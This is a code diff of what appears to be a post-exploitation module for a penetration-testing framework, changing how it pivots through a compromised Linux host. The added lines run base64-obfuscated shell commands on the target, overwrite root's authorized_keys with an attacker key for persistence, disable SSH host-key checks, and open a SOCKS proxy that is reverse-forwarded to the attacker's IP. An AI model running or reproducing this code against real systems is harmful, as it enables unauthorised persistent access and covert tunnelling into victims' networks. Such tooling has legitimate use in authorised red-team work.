@@ -47,19 +47,31 @@ class Module(BaseModule):
             attacker_ip = result.stdout
 
             # get the attacker lan
-            payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\'')
+            payload = base64.b64encode(b'ip -o -f inet addr show | awk \'/scope global/ {print $4}\' | head -1')
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
             session.log(f'Target LAN: {result.stdout}')
             target_lan = result.stdout
 
             # transfer files from target to attacker
-            session.log("copying private key...")
+            session.log("copying private key to target...")
             with open(f'/home/socksuser/.ssh/socksuser_key','rb') as f1:
                 with session.platform.open('/tmp/sockskey', 'wb') as f2:
                     f2.write(f1.read())
+            result = session.platform.run(f"/bin/bash -c 'chmod 0600 /tmp/sockskey'")
+            session.log("add public key to authorized on target...")
+            with open(f'/home/socksuser/.ssh/socksuser_key.pub','rb') as f1:
+                with session.platform.open('/root/.ssh/authorized_keys', 'wb') as f2:
+                    f2.write(f1.read())
             
-            # start socks proxy via ssh
-            payload = base64.b64encode(f'ssh -q -i /tmp/sockskey -f -N -D 9050 socksuser@{attacker_ip}'.encode())
+            # create socksproxy on target
+            payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -D 9050 localhost'.encode())
+            result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
+            session.log(f'Return Code: {result.returncode}')
+            session.log(f'Output: {result.stdout}')
+            session.log(f'Error Output: {result.stderr}')
+
+            # forward local socksproxy to attacker
+            payload = base64.b64encode(f'ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/sockskey -f -N -R 9050:localhost:9050 socksuser@{attacker_ip}'.encode())
             result = session.platform.run(f"/bin/bash -c 'echo {payload.decode()} | base64 -d | /bin/bash'")
             session.log(f'Return Code: {result.returncode}')
             session.log(f'Output: {result.stdout}')
